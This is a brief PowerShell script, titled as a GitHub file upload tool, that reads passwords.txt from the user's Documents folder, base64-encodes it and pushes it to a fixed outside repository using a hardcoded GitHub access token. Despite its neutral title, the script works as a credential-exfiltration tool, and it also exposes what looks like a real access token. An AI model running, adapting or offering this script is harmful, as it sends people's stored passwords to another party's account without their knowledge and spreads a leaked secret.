# GitHub File Upload Script

$token = "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"
$owner = "tomasgit17"
$repo = "files"
$filePath = "$env:USERPROFILE\Documents\passwords.txt"
$branch = "main"  # or "master", depending on your repository's default branch

# Read the file content
$fileContent = Get-Content $filePath -Raw
$fileContentBase64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($fileContent))

# Prepare the API request payload
$body = @{
    message = "Upload passwords.txt via PowerShell script"
    content = $fileContentBase64
    branch = $branch
} | ConvertTo-Json

# Prepare headers
$headers = @{
    Authorization = "token $token"
    Accept = "application/vnd.github.v3+json"
}

# GitHub API endpoint for file upload
$uri = "https://api.github.com/repos/$owner/$repo/contents/$filePath"

# Send the request
try {
    $response = Invoke-RestMethod -Uri $uri -Method Put -Headers $headers -Body $body
    Write-Host "File uploaded successfully!" -ForegroundColor Green
    Write-Host "File URL: $($response.content.html_url)"
} catch {
    Write-Host "Error uploading file:" -ForegroundColor Red
    Write-Host $_.Exception.Message
}
